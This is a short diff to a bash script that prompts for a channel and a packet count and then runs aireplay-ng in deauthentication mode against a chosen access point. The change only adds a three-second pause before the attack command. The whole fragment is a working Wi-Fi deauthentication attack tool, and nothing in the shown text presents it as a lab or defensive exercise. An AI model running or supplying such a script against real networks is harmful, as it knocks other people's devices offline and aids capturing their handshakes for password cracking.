@@ -13,4 +13,5 @@ read -p "channel?: " channel
 read -p "count?: " count
 
 sudo iwconfig $INTERFACE channel $channel
+sleep 3
 sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
